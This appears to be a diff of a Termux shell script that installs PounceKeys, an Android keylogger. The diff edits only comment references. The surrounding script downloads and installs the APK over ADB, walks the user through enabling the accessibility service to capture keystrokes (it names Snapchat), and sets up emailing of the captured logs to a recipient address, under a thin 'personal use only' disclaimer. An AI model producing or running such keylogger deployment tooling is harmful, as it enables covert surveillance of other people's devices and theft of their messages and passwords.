@@ -7,10 +7,10 @@ set -euo pipefail
 # Security: No root, minimal permissions, checksum verification
 # Last updated: June 25, 2025
 # Legal: For personal use on your own device only; unauthorized use is illegal
-# $ref: master.json#/settings/core/comments_policy
+# $ref: deploy_inventory.json#/settings/core/comments_policy
 
 # Configuration (readonly for POLA)
-# $ref: master.json#/settings/optimization_patterns/enforce_least_privilege
+# $ref: deploy_inventory.json#/settings/optimization_patterns/enforce_least_privilege
 readonly LOG_FILE="$HOME/pouncekeys_setup.log"
 readonly APK_FILE="$HOME/pouncekeys.apk"
 readonly APK_URL="https://github.com/NullPounce/pounce-keys/releases/latest/download/pouncekeys.apk"
@@ -21,24 +21,24 @@ readonly MAX_ANDROID_VERSION=15
 readonly EXPECTED_CHECKSUM="expected_sha256_hash_here" # Replace with actual SHA256 from PounceKeys GitHub
 
 # Initialize logging (DRY, KISS)
-# $ref: master.json#/settings/communication/notification_policy
+# $ref: deploy_inventory.json#/settings/communication/notification_policy
 [[ -f "$LOG_FILE" && $(stat -f %z "$LOG_FILE") -gt 1048576 ]] && mv "$LOG_FILE" "${LOG_FILE}.old"
 echo "PounceKeys Setup Log - $(date)" > "$LOG_FILE"
 exec 1>>"$LOG_FILE" 2>&1
 
 # Cleanup on exit (POLA, error recovery)
-# $ref: master.json#/settings/core/task_templates/refine
+# $ref: deploy_inventory.json#/settings/core/task_templates/refine
 trap 'rm -f "$APK_FILE"; log_and_toast "Script terminated, cleaned up."; exit 1' INT TERM
 
 # Log and toast function (DRY, NNGroup visibility)
-# $ref: master.json#/settings/communication/style
+# $ref: deploy_inventory.json#/settings/communication/style
 log_and_toast() {
     echo "[$(date +%H:%M:%S)] $1"
     termux-toast -s "$1" >/dev/null 2>&1
 }
 
 # Legal disclaimer (NNGroup user control, YAGNI)
-# $ref: master.json#/settings/feedback/roles/lawyer
+# $ref: deploy_inventory.json#/settings/feedback/roles/lawyer
 log_and_toast "Starting PounceKeys setup"
 echo "WARNING: For personal use only. Unauthorized use violates laws (e.g., U.S. CFAA, EU GDPR)."
 echo "Purpose: Install PounceKeys to log keystrokes (e.g., Snapchat) and email logs."
@@ -47,7 +47,7 @@ read -k 1 confirm
 [[ "$confirm" != "Y" && "$confirm" != "y" ]] && { log_and_toast "Setup cancelled."; exit 0; }
 
 # Check prerequisites (error prevention, KISS)
-# $ref: master.json#/settings/core/task_templates/validate
+# $ref: deploy_inventory.json#/settings/core/task_templates/validate
 log_and_toast "Checking internet..."
 ping -c 1 google.com >/dev/null 2>&1 || {
     log_and_toast "Error: No internet."
@@ -65,7 +65,7 @@ command -v pkg >/dev/null 2>&1 || {
 }
 
 # Install dependencies (DRY, automated deployment)
-# $ref: master.json#/settings/installer_integration
+# $ref: deploy_inventory.json#/settings/installer_integration
 log_and_toast "Installing dependencies..."
 echo "Install wget, curl, adb, termux-api, android-tools? (Y/N)"
 read -k 1 install_deps
@@ -80,7 +80,7 @@ read -k 1 install_deps
 }
 
 # Validate environment (error prevention, KISS)
-# $ref: master.json#/settings/core/task_templates/validate
+# $ref: deploy_inventory.json#/settings/core/task_templates/validate
 log_and_toast "Checking ADB..."
 adb devices | grep -q device || {
     log_and_toast "Error: No device detected."
@@ -99,7 +99,7 @@ ANDROID_VERSION=$(adb shell getprop ro.build.version.release | cut -d. -f1)
 }
 
 # Email configuration (NNGroup recognition, security)
-# $ref: master.json#/settings/communication/style
+# $ref: deploy_inventory.json#/settings/communication/style
 log_and_toast "Configuring email..."
 echo "Use Gmail? (Y/N)"
 read -k 1 use_gmail
@@ -126,7 +126,7 @@ else
 fi
 
 # Download and verify APK (DRY, robust error handling)
-# $ref: master.json#/settings/installer_integration/verify_integrity
+# $ref: deploy_inventory.json#/settings/installer_integration/verify_integrity
 log_and_toast "Downloading APK..."
 wget -O "$APK_FILE" "$APK_URL" || wget -O "$APK_FILE" "$FALLBACK_URL" || {
     log_and_toast "Error: Download failed."
@@ -144,7 +144,7 @@ ACTUAL_CHECKSUM=$(sha256sum "$APK_FILE" | awk '{print $1}')
 }
 
 # Install APK (automated deployment, POLA)
-# $ref: master.json#/settings/core/task_templates/build
+# $ref: deploy_inventory.json#/settings/core/task_templates/build
 log_and_toast "Installing APK..."
 echo "Enable 'Install from Unknown Sources' in Settings > Security."
 echo "1. Navigate to Settings > Security (or Privacy)."
@@ -161,7 +161,7 @@ adb install "$APK_FILE" || {
 rm -f "$APK_FILE"
 
 # Configure PounceKeys (NNGroup recognition, accessibility compliance)
-# $ref: master.json#/settings/core/task_templates/refine
+# $ref: deploy_inventory.json#/settings/core/task_templates/refine
 log_and_toast "Enable accessibility service..."
 echo "This allows PounceKeys to capture keystrokes."
 echo "1. Go to Settings > Accessibility > Downloaded Services."
@@ -189,7 +189,7 @@ echo "Press Enter after configuring..."
 read -p ""
 
 # Validation and testing (validation, user control)
-# $ref: master.json#/settings/core/task_templates/test
+# $ref: deploy_inventory.json#/settings/core/task_templates/test
 log_and_toast "Setup complete!"
 echo "Test by typing 'PounceKeys test' in any app."
 echo "Check $recipient_email for logs within 10 minutes."
